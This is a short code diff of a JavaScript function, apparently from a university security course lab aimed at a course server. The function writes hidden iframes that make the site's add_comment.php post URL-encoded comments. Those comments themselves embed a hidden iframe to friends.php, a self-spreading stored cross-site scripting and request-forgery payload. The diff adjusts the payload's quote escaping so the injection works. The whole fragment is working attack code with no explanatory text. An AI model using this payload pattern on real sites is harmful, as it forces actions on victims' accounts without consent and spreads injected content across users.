@@ -6,7 +6,7 @@ function moveitmoveit() {
        var arr = stringy.split(',');
        for( var i = 0; i < arr.length; i++){
            // alert(arr[i]);
-           var stringFrame = "%3Ciframe%20id%3D%27hiddenone%27%20src%3D%27http%3A%2F%2Fcsec380-core.csec.rit.edu%3A86%2Ffriends.php%22%3E%3C%2Fiframe%3E";
+           var stringFrame = "%3Ciframe%20id%3D%27hiddenone%27%20src%3D%27http%3A%2F%2Fcsec380-core.csec.rit.edu%3A86%2Ffriends.php%27%3E%3C%2Fiframe%3E%22%3E%3C%2Fiframe%3E";
            var frameComment = "%3Ciframe%20style%3D%22display%3A%20none%22%20src%3D%22http%3A%2F%2Fcsec380-core.csec.rit.edu%3A86%2Fadd_comment.php%3Fid%3D"+i+"%26comment%3D"+stringFrame;
            document.write(frameComment);
            alert("done");
